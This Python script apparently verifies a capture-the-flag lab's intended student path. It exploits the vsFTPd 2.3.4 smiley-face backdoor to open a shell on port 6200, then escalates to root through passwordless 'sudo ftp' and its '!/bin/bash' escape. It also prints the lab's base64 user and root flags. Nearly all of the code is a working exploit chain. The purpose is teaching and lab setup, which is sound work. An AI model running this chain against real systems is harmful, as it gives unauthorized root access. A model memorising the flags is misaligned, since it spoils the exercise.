#!/usr/bin/env python3
"""Verify the complete student path from a separate machine."""

import argparse
import socket
import time


def read_until(connection: socket.socket, marker: bytes) -> str:
    result = b""
    while marker not in result:
        chunk = connection.recv(4096)
        if not chunk:
            raise SystemExit(f"shell closed before {marker!r}: {result!r}")
        result += chunk
    return result.decode(errors="replace")


def run_with_prompt(connection: socket.socket, command: str, marker: bytes) -> str:
    connection.sendall(command.encode() + b"\n")
    output = read_until(connection, marker)
    print(f"$ {command}\n{output}")
    return output


def run_quiet_shell(connection: socket.socket, command: str) -> str:
    marker = b"__CTF_COMMAND_DONE__"
    connection.sendall(command.encode() + b"\nprintf '__CTF_COMMAND_DONE__\\n'\n")
    output = read_until(connection, marker)
    print(f"$ {command}\n{output}")
    return output


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Ubuntu VM address reachable from Kali")
parser.add_argument("--ftp-port", type=int, default=5678)
args = parser.parse_args()

with socket.create_connection((args.host, args.ftp_port), timeout=5) as ftp:
    ftp.settimeout(5)
    banner = ftp.recv(1024).decode(errors="replace").strip()
    print(f"FTP: {banner}")
    if "vsFTPd 2.3.4" not in banner:
        raise SystemExit("unexpected FTP banner")
    ftp.sendall(b"USER student:)\r\n")
    response = ftp.recv(1024).decode(errors="replace").strip()
    if not response.startswith("331 "):
        raise SystemExit(f"FTP did not accept the test username: {response}")
    ftp.sendall(b"PASS test\r\n")
    time.sleep(0.2)

for attempt in range(20):
    try:
        shell = socket.create_connection((args.host, 6200), timeout=2)
        break
    except (ConnectionRefusedError, ConnectionResetError):
        if attempt == 19:
            raise
        time.sleep(0.2)

user_flag = "SU5TX0NURntJTlMtVmVuZHVydXRoeX1VU0VSLnR4dA=="
root_flag = "SU5TX0NURntTaGFtX05vX1ZhcnVuYWh9cm9vdC50eHQ="
with shell:
    shell.settimeout(8)
    if "uid=1001(vyshu)" not in run_quiet_shell(shell, "id"):
        raise SystemExit("initial shell is not vyshu")
    if "/home/vyshu" not in run_quiet_shell(shell, "pwd"):
        raise SystemExit("initial shell is not in /home/vyshu")
    user_text = run_quiet_shell(shell, "cat /home/vyshu/INS.txt")
    if user_flag not in user_text:
        raise SystemExit("user file content is incorrect")
    listing = run_quiet_shell(shell, "sudo -n -l")
    if "(root) NOPASSWD: /usr/bin/ftp" not in listing:
        raise SystemExit("sudo ftp is not passwordless")
    run_with_prompt(shell, "sudo -n ftp", b"ftp> ")
    run_with_prompt(shell, "!/bin/bash", b"root@")
    if "uid=0(root)" not in run_with_prompt(shell, "id", b"root@"):
        raise SystemExit("FTP shell escape did not reach root")
    root_text = run_with_prompt(shell, "cat /root/commander.txt", b"root@")
    if root_flag not in root_text:
        raise SystemExit("root file content is incorrect")

print("Complete student path verified. Recreate the target before students begin.")
